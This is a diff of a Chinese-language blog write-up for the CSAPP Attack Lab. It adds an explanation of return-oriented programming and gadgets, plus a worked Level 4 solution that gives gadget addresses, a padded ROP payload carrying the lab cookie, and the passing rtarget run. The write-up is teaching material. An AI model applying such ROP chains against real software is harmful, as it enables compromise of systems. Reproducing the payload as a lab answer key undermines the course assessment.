@@ -94,7 +94,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      5 min read
+      7 min read
     
 </span></p>
 
@@ -136,9 +136,9 @@ window.onload = wrap_img;
 <ul>
 <li class="toc-entry toc-h4"><a href="#0x11-level-1">0x1.1 Level 1</a></li>
 <li class="toc-entry toc-h4"><a href="#0x12-level-2">0x1.2 Level 2</a></li>
+<li class="toc-entry toc-h4"><a href="#0x13-level-3">0x1.3 Level 3</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h3"><a href="#0x13-level-3">0x1.3 Level 3</a></li>
 <li class="toc-entry toc-h3"><a href="#0x2-return-oriented-programming">0x2 Return-Oriented Programming</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#0x21-level-4">0x2.1 Level 4</a></li>
@@ -410,8 +410,8 @@ Valid solution <span class="k">for </span>level 2 with target ctarget
 PASS: Would have posted the following:
 </code></pre></div></div>
 
-<h3 id="0x13-level-3">
-<a class="anchor" href="#0x13-level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.3 Level 3</h3>
+<h4 id="0x13-level-3">
+<a class="anchor" href="#0x13-level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.3 Level 3</h4>
 
 <p><code class="language-plaintext highlighter-rouge">sval</code> 就是需要我们传入的参数，<code class="language-plaintext highlighter-rouge">cookie</code> 是需要比较的内容，可以先找到 <code class="language-plaintext highlighter-rouge">touch3</code> 函数的地址是 <code class="language-plaintext highlighter-rouge">0x4018fa</code>，先使用 <code class="language-plaintext highlighter-rouge">gdb</code>在 <code class="language-plaintext highlighter-rouge">touch3</code> 的入口打上断点，然后按照 level1 的做法，让程序在 <code class="language-plaintext highlighter-rouge">return</code> 之后跳转到 <code class="language-plaintext highlighter-rouge">touch3</code>，接着单步运行，到执行 <code class="language-plaintext highlighter-rouge">hexmatch</code> 函数之前，这个时候可以通过下面的方式访问需要的字符串以及他们对应的 16 进制数字</p>
 
@@ -466,8 +466,88 @@ PASS: Would have posted the following:
 <h3 id="0x2-return-oriented-programming">
 <a class="anchor" href="#0x2-return-oriented-programming" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x2 Return-Oriented Programming</h3>
 
+<p>有的时候采用 <code class="language-plaintext highlighter-rouge">code-injection</code> 攻击会变得非常困难，因为有两个技术可以用来防止这种攻击：</p>
+
+<ul>
+  <li>
+    <p>使用 randomization 的方式，每一次 stack position 都会不一样，所以没有办法确定插入的代码在计算机中的地址，也就无法让程序运行插入的代码。</p>
+  </li>
+  <li>
+    <p>标记 stack 所在的内存为不可执行的状态，在这个情况下，即使插入了攻击的代码，在运行它的时候也会遇到 segmentation fault。</p>
+  </li>
+</ul>
+
+<p>那么是不是在这种情况下我们就无法对程序进行攻击了呢？</p>
+
+<p>聪明的程序员发现可以通过执行代码中存在的片段而不是插入代码来实现攻击，最通用的方式叫做 <em>return-oriented programming</em>(ROP)，这种策略通过识别存在于程序中 <code class="language-plaintext highlighter-rouge">ret</code> 字节序列中的一个或多个指令，这些片段叫做 <em>gadget</em>.</p>
+
+<div align="center">
+<img src="/blogpages/images/csapp-attack/gadget.png" width="500">
+</div>
+
+<p>上面的图举例说明了一个 stack 是如何执行一系列的 gadgets，图中的 stack 包含了一系列 gadget 地址，每个 gadget 包含了一系列指令的字节，不过字节的最后是 <code class="language-plaintext highlighter-rouge">0xc3</code>，这个字节表示 <code class="language-plaintext highlighter-rouge">ret</code>，每次执行完一条指令之后，就可以跳到上一条指令继续执行，这样就可以形成一个序列的执行指令。</p>
+
+<p>例如，下面的 C 函数可以对应生成的会变代码如下</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">setval_210</span><span class="p">(</span><span class="n">unsinged</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">3347663060U</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0000000000400</span><span class="nx">f15</span> <span class="o">&lt;</span><span class="nx">setval_210</span><span class="o">&gt;</span><span class="p">:</span>
+<span class="mi">400</span><span class="nx">f15</span><span class="p">:</span> <span class="nx">c7</span> <span class="mi">07</span> <span class="nx">d4</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nx">c7</span>  <span class="nx">movl</span>  <span class="nx">$0xc78948d4</span><span class="p">,(</span><span class="o">%</span><span class="nx">rdi</span><span class="p">)</span>
+<span class="mi">400</span><span class="nx">f1b</span><span class="p">:</span> <span class="nx">c3</span>                 <span class="nx">retq</span>
+</code></pre></div></div>
+
+<p>字节序列 <code class="language-plaintext highlighter-rouge">48 89 c7</code> 可以编码一个指令 <code class="language-plaintext highlighter-rouge">movq %rax, %rdi</code>，同时这个序列最后包含 <code class="language-plaintext highlighter-rouge">c3</code>，即 <code class="language-plaintext highlighter-rouge">ret</code> 指令。同时这个函数的开始地址是 <code class="language-plaintext highlighter-rouge">0x400f15</code>，序列从第四个字节开始，所以这就是一个 gadget，可以达到的效果是将寄存器 <code class="language-plaintext highlighter-rouge">%rax</code> 的值放到寄存器 <code class="language-plaintext highlighter-rouge">%rdi</code> 中。</p>
+
 <h4 id="0x21-level-4">
 <a class="anchor" href="#0x21-level-4" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x2.1 Level 4</h4>
+
+<p>在 level4 中，只需要重复 level2 的过程，但是 level2 是通过 code-injection 进行攻击的，level4 采用 gadget 的方式，可以通过 <code class="language-plaintext highlighter-rouge">gdb</code> 发现每次运行 <code class="language-plaintext highlighter-rouge">$rsp</code> 在不同，所以不能准确地定位到插入代码的位置。</p>
+
+<p><code class="language-plaintext highlighter-rouge">rtarget.s</code> 中提供了一系列的可执行序列，可以在里面选择需要执行的 gadget 序列。</p>
+
+<p>对于 level2 而言，可以构造下面的汇编代码达到目的，因为 <code class="language-plaintext highlighter-rouge">pop %rax</code> 可以先将 <code class="language-plaintext highlighter-rouge">$rsp</code> 的内容写到 <code class="language-plaintext highlighter-rouge">$rax</code> 中，然后再将其赋值到 <code class="language-plaintext highlighter-rouge">$rdi</code> 中就实现了我们需要的结果。</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pop</span> <span class="o">%</span><span class="nx">rax</span><span class="p">;</span> <span class="mi">58</span>
+<span class="nx">movq</span> <span class="o">%</span><span class="nx">rax</span><span class="p">,</span> <span class="o">%</span><span class="nx">rdi</span><span class="p">;</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nx">c7</span> 
+<span class="nx">retq</span><span class="p">;</span> <span class="nx">c3</span>
+</code></pre></div></div>
+
+<p>在 <code class="language-plaintext highlighter-rouge">rtarget.s</code> 中可以找到下面两个函数，其中正好有我们需要的指令序列，第一个指令的开始位置为 <code class="language-plaintext highlighter-rouge">4019cc</code>，执行的序列为 <code class="language-plaintext highlighter-rouge">58 90 c3</code>，其中 <code class="language-plaintext highlighter-rouge">0x90</code> 表示 <code class="language-plaintext highlighter-rouge">nop</code> 指令，所以这对应于 <code class="language-plaintext highlighter-rouge">pop %rax</code> + <code class="language-plaintext highlighter-rouge">retq</code>。</p>
+
+<p>而 <code class="language-plaintext highlighter-rouge">4019a2</code> 则为 <code class="language-plaintext highlighter-rouge">48 89 c7 c3</code>，这就对应 <code class="language-plaintext highlighter-rouge">movq %rax, %rdi</code> + <code class="language-plaintext highlighter-rouge">retq</code>。</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00000000004019</span><span class="nx">ca</span> <span class="o">&lt;</span><span class="nx">getval_280</span><span class="o">&gt;</span><span class="p">:</span>
+  <span class="mi">4019</span><span class="nx">ca</span><span class="p">:</span>	<span class="nx">b8</span> <span class="mi">29</span> <span class="mi">58</span> <span class="mi">90</span> <span class="nx">c3</span>       	<span class="nx">mov</span>    <span class="nx">$0xc3905829</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
+  <span class="mi">4019</span><span class="nx">cf</span><span class="p">:</span>	<span class="nx">c3</span>                   	<span class="nx">retq</span>   
+
+<span class="mi">00000000004019</span><span class="nx">a0</span> <span class="o">&lt;</span><span class="nx">addval_273</span><span class="o">&gt;</span><span class="p">:</span>
+  <span class="mi">4019</span><span class="nx">a0</span><span class="p">:</span>	<span class="mi">8</span><span class="nx">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nx">c7</span> <span class="nx">c3</span>    	<span class="nx">lea</span>    <span class="o">-</span><span class="mh">0x3c3876b8</span><span class="p">(</span><span class="o">%</span><span class="nx">rdi</span><span class="p">),</span><span class="o">%</span><span class="nx">eax</span>
+  <span class="mi">4019</span><span class="nx">a6</span><span class="p">:</span>	<span class="nx">c3</span>                   	<span class="nx">retq</span>   
+</code></pre></div></div>
+
+<p>所以最后写入的 txt 文本为</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="nx">cc</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="err">#</span> <span class="nx">执行</span> <span class="nx">pop</span> <span class="o">%</span><span class="nx">rax</span> <span class="nx">指令</span> <span class="o">+</span> <span class="nx">retq</span>
+<span class="nx">fa</span> <span class="mi">97</span> <span class="nx">b9</span> <span class="mi">59</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="err">#</span> <span class="nx">cookie</span> <span class="nx">的值</span> <span class="mh">0x59b997fa</span>
+<span class="nx">a2</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="err">#</span> <span class="nx">执行</span> <span class="nx">movq</span> <span class="o">%</span><span class="nx">rax</span><span class="p">,</span> <span class="o">%</span><span class="nx">rdi</span> <span class="o">+</span> <span class="nx">retq</span>
+<span class="nx">ec</span> <span class="mi">17</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="err">#</span> <span class="nx">执行</span> <span class="nx">touch2</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hex2raw <span class="nt">-i</span> rtarget.2.txt | ./rtarget <span class="nt">-q</span>
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2<span class="o">(</span>0x59b997fa<span class="o">)</span>
+Valid solution <span class="k">for </span>level 2 with target rtarget
+PASS: Would have posted the following:
+</code></pre></div></div>
 
 <h4 id="0x22-level-5">
 <a class="anchor" href="#0x22-level-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x2.2 Level 5</h4>
